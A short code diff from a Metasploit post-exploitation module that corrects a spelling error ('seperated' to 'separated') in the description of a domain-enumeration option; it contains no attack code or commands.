@@ -50,7 +50,7 @@ class MetasploitModule < Msf::Post
     register_options([
       OptBool.new('ALL', [false, 'Enumerate all domains on network.', true]),
       OptBool.new('STORE', [false, 'Store the enumerated files in loot.', true]),
-      OptString.new('DOMAINS', [false, 'Enumerate list of space seperated domains DOMAINS="dom1 dom2".'])])
+      OptString.new('DOMAINS', [false, 'Enumerate list of space separated domains DOMAINS="dom1 dom2".'])])
   end
 
   def run
